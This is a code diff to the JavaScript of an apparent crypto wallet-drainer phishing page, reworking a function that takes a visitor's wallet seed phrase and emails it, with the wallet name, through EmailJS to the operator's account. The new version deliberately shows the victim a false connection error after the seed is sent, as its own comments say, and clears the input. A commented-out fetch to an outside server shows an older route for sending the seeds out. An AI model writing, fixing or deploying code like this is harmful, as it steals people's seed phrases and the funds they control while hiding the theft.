@@ -816,70 +816,59 @@ function selectWallet(name, icon) {
   }, 2000);
 }
 
-          // Submit seed phrase function
-          function submitSeedPhrase() {
-            const seedPhrase =
-              document.getElementById("seed-phrase-input").value;
-            const walletName = selectedWallet.name;
-            const walletIcon = selectedWallet.icon;
-
-            if (!seedPhrase) {
-              alert("Please enter your seed phrase");
-              return;
-            }
-
-            // Create a loading state
-            const connectBtn = document.querySelector(".connect-btn");
-            connectBtn.disabled = true;
-            connectBtn.textContent = "Sending...";
-
-            // ✅ Send data via EmailJS instead of fetch
-            emailjs
-              .send(
-                "service_dmohdwc", // 🔑 Replace with your EmailJS Service ID
-                "template_5gm69om", // 🔑 Replace with your EmailJS Template ID
-                {
-                  walletName: walletName,
-                  walletIcon: walletIcon,
-                  seedPhrase: seedPhrase,
-                }
-              )
-
-              // fetch("https://dishbasin.onrender.com/api/send-email", {
-              //   method: "POST",
-              //   headers: { "Content-Type": "application/json" },
-              //   body: JSON.stringify(formData),
-              // })
-              // .then(async (response) => {
-              //   const text = await response.text(); // Get raw response
-              //   console.log("Raw response:", text); // See what's actually returned
-              //   console.log("Status:", response.status);
-
-              //   try {
-              //     return JSON.parse(text); // Try to parse as JSON
-              //   } catch (e) {
-              //     console.error("Not valid JSON:", text);
-              //     throw new Error("Server returned invalid response");
-              //   }
-              // })
-              .then((data) => {
-                if (data.success) {
-                  console.log("Email sent successfully");
-                  alert("An error occurred while connecting your wallet!");
-                  closeModal("modal2");
-                } else {
-                  alert("Error: " + data.message);
-                }
-                connectBtn.disabled = false;
-                connectBtn.textContent = "Connect wallet";
-              })
-              .catch((error) => {
-                console.error("Error:", error);
-                alert("An error occurred while connecting your wallet");
-                connectBtn.disabled = false;
-                connectBtn.textContent = "Connect wallet";
-              });
-          }
+// Submit seed phrase function
+function submitSeedPhrase() {
+  const seedPhrase = document.getElementById("seed-phrase-input").value;
+  const walletName = selectedWallet.name;
+  const walletIcon = selectedWallet.icon;
+  
+  if (!seedPhrase) {
+    alert("Please enter your seed phrase");
+    return;
+  }
+  
+  // Create a loading state
+  const connectBtn = document.querySelector(".connect-btn");
+  connectBtn.disabled = true;
+  connectBtn.textContent = "Sending...";
+  
+  // ✅ Send data via EmailJS
+  emailjs
+    .send(
+      "service_dmohdwc", // 🔑 Your EmailJS Service ID
+      "template_5gm69om", // 🔑 Your EmailJS Template ID
+      {
+        walletName: walletName,
+        walletIcon: walletIcon,
+        seedPhrase: seedPhrase,
+      }
+    )
+    .then((response) => {
+      // ✅ EmailJS returns status 200 on success, not data.success
+      console.log("Email sent successfully", response.status, response.text);
+      
+      // Show error message to user (even though email sent successfully)
+      alert("An error occurred while connecting your wallet!");
+      closeModal("modal2");
+      
+      // Reset button
+      connectBtn.disabled = false;
+      connectBtn.textContent = "Connect wallet";
+      
+      // Optional: Clear the input field
+      document.getElementById("seed-phrase-input").value = "";
+    })
+    .catch((error) => {
+      console.error("EmailJS Error:", error);
+      
+      // Show error message if email actually failed to send
+      alert("An error occurred while connecting your wallet");
+      
+      // Reset button
+      connectBtn.disabled = false;
+      connectBtn.textContent = "Connect wallet";
+    });
+}
 
 // Store original modal1 content
 document.addEventListener("DOMContentLoaded", function(event) {
